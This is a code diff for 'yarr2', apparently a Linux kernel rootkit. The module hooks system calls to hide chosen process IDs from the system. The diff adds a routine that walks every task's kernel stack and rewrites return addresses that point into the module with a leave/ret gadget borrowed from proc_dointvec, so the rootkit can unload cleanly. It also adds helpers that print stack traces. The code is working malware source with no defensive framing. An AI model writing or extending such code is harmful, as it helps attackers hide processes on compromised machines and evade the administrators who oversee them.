@@ -1,8 +1,13 @@
 #include <linux/slab.h>
-#include <asm/current.h>
 #include <linux/sched.h>
 #include <linux/sched/task.h>
 #include <linux/rbtree.h>
+#include <linux/sched/signal.h>
+#include <linux/module.h>
+
+#include <asm/current.h>
+#include <asm/unwind.h>
+#include <asm/processor.h>
 
 #include "hidepid.h"
 #include "log.h"
@@ -18,7 +23,7 @@ typedef struct hidden_pid {
 struct rb_root __hidden_pid_list = RB_ROOT;
 
 // We depend on hook subsystem to have this information.
-unsigned long *__sct = NULL;
+static unsigned long *__sct = NULL;
 
 // TODO: Document functions.
 
@@ -38,6 +43,24 @@ static inline int __hidepid_initialized(void) {
  */
 static inline int __pid_is_self(pid_t pid) {
     return (current->pid == pid || pid == 0)? 0x01ec0ded: 0;
+}
+
+static __HiddenPid_t * __HiddenPid_init(pid_t pid) {
+    __HiddenPid_t *this;
+
+    this = kmalloc(sizeof(__HiddenPid_t), GFP_KERNEL);
+    if (this == NULL) {
+        yarr_log("Couldn't allocate memory for __HiddenPid_t");
+        return NULL;
+    }
+
+    this->pid = pid;
+    return this;
+}
+
+static void __HiddenPid_free(__HiddenPid_t *this) {
+    kfree(this);
+    return;
 }
 
 static __HiddenPid_t * __HiddenPid_search(struct rb_root *tree, pid_t pid) {
@@ -94,26 +117,6 @@ static int __HiddenPid_insert(struct rb_root *tree, __HiddenPid_t *new_entry) {
     return 0;
 }
 
-static int __HiddenPid_init(__HiddenPid_t *this, pid_t pid) {
-    if (this == NULL) {
-        yarr_log("this is NULL");
-        return -1;
-    }
-
-    this->pid = pid;
-    this->node.rb_left = NULL;
-    this->node.rb_right = NULL;
-    return 0;
-}
-
-static void __HiddenPid_free(__HiddenPid_t *this) {
-    if (this != NULL) {
-        kfree(this);
-    }
-
-    return;
-}
-
 /**
  * Checks if a pid is already hidden.
  *
@@ -122,6 +125,127 @@ static void __HiddenPid_free(__HiddenPid_t *this) {
  */
 static inline int __pid_is_hidden(pid_t pid) {
     return (__HiddenPid_search(&__hidden_pid_list, pid) == NULL)? 0: 1;
+}
+
+/**
+ * Returns a pointer to the location of the return address in the current frame
+ * where the unwinder is. This is just a mere copy of the
+ * unwind_get_return_address_ptr implemented in the kernel itself in
+ * arch/x86/kernel/unwind_frame.c that for some reason is not exported.
+ */
+static inline unsigned long *
+__yarr_unwind_get_return_address_ptr(struct unwind_state *state) {
+    if (unwind_done(state)) {
+        return NULL;
+    }
+
+    return state->regs ? &state->regs->ip : state->bp + 1;
+}
+
+/**
+ * Kernel's unwind engine doesn't implement this function, and we need it to
+ * modify the frame pointer of the stack frames.
+ */
+static inline unsigned long *
+__yarr_unwind_get_frame_address_ptr(struct unwind_state *state) {
+    if (unwind_done(state)) {
+        return NULL;
+    }
+
+    return state->regs ? &state->regs->bp : state->bp;
+}
+
+static void __print_task_stackframe(struct task_struct *task) {
+    struct unwind_state state;
+    unsigned long *sp, *ret_addr_ptr;
+
+    if (task != NULL) {
+        sp = get_stack_pointer(task, NULL);
+        unwind_start(&state, task, NULL, sp);
+        yarr_log("Stacktrace of task %d (%s)", task->pid, task->comm);
+
+        while (!unwind_done(&state)) {
+            ret_addr_ptr = __yarr_unwind_get_return_address_ptr(&state);
+            yarr_log("%pB (0x%lx)", (void *)(*ret_addr_ptr), *ret_addr_ptr);
+            unwind_next_frame(&state);
+        }
+
+        yarr_log("");
+    }
+}
+
+static int __print_stackframes(void) {
+    struct task_struct *task;
+
+    for_each_process(task) {
+        __print_task_stackframe(task);
+    }
+
+    return 0;
+}
+
+/**
+ * There's a nasty situation that can happen when unloading yarr2.
+ *
+ * Imagine this situation. Yarr2 is loaded and some syscall is hooked. A
+ * task calls such syscall, what means that it will go through our hook
+ * and then through the kernel's syscall. This means that the kernel's
+ * stack of that task has a reference to our hook, the returning address.
+ * Now, before this syscall is finished yarr2 is unloaded from the kernel,
+ * hence the hook disappears. Later the syscall is about to finish but when
+ * returning from it, at some point it has to return to the hook, there's a
+ * returning address that says so in some stack frame, but since that code
+ * is long gone that task, in kernel-space, incurs into a page fault.
+ *
+ * I just described the situation with one task, but this can happen with
+ * many of them. In reality I don't see this happening much BUT there is
+ * one case that happens every single time.
+ *
+ * wait4 is one of our hooked syscalls. When we want to rmmod yarr2, the
+ * shell forks/execves to create the rmmod task, then the parent task, the
+ * shell, waits for its child, rmmod, to finish. When the rmmod finishes
+ * yarr2 is no longer in the kernel, and when the shell task wakes up and
+ * tries to return it goes into an oops.
+ */
+static int __fix_stacks(void) {
+    struct task_struct *task;
+    struct unwind_state state;
+    struct module *yarr2_module;
+    unsigned long *sp;
+    unsigned long *ret_addr_ptr, ret_addr;
+    /*This is the address of a leaveq + retq instructions sequence that we are
+     going to use as the way to return from a hooked system call when yarr2 is
+     not in the kernel anymore.*/
+    const int LEAVE_RET_OFFSET = 39;
+    void *leave_ret_gadget = proc_dointvec + LEAVE_RET_OFFSET;
+
+    yarr2_module = find_module("yarr2");
+    if (yarr2_module == NULL) {
+        yarr_log("Couldn't find yarr2 module. DAFUK?");
+        return -1;
+    }
+
+    for_each_process(task) {
+        /*We must not modify the stack of the current process, the one running
+         the rmmod.*/
+        if (task != current) {
+            sp = get_stack_pointer(task, NULL);
+            unwind_start(&state, task, NULL, sp);
+    
+            while (!unwind_done(&state)) {
+                ret_addr_ptr = __yarr_unwind_get_return_address_ptr(&state);
+                ret_addr = READ_ONCE_TASK_STACK(task, *ret_addr_ptr);
+    
+                if (within_module(ret_addr, yarr2_module)) {
+                    WRITE_ONCE(*ret_addr_ptr, leave_ret_gadget);
+                }
+    
+                unwind_next_frame(&state);
+            }
+        }
+    }
+
+    return 0;
 }
 
 /* This is the list of syscalls that have the type pid_t among their arguments:
@@ -163,7 +287,6 @@ asmlinkage long __yarr__x64_sys_setpgid(const struct pt_regs *regs) {
     long (*__x64_sys_setpgid)(const struct pt_regs *);
     pid_t pid;
     pid_t pgid;
-//    struct pid *gl_pid;
 
     if (regs == NULL) {
         yarr_log("regs are NULL");
@@ -641,6 +764,8 @@ int hidepid_finish(void) {
     __hidden_pid_list = RB_ROOT;
     __sct = NULL;
 
+    __fix_stacks();
+
     return 0;
 }
 
@@ -678,17 +803,10 @@ int hidepid_install_hooks(void) {
 
 int hide_pid(pid_t pid) {
     __HiddenPid_t *new_entry;
-    int err;
 
-    new_entry = kmalloc(sizeof(__HiddenPid_t), GFP_KERNEL);
+    new_entry = __HiddenPid_init(pid);
     if (new_entry == NULL) {
-        yarr_log("Couldn't allocate memory for new entry");
-        return -1;
-    }
-
-    err = __HiddenPid_init(new_entry, pid);
-    if (err) {
-        yarr_log("Error initializing pid");
+        yarr_log("Error initializing __HiddenPid_t");
         return -1;
     }
 
@@ -715,12 +833,16 @@ void unhide_pid_all(void) {
     iter = rb_first(&__hidden_pid_list);
     while (iter != NULL) {
         entry = rb_entry(iter, __HiddenPid_t, node);
-
         next = rb_next(iter);
-        rb_erase(&entry->node, &__hidden_pid_list);
 
+        rb_erase(&entry->node, &__hidden_pid_list);
         __HiddenPid_free(entry);
+
         iter = next;
     }
+}
+
+void show_tasks_stacks(void) {
+    __print_stackframes();
 }
 
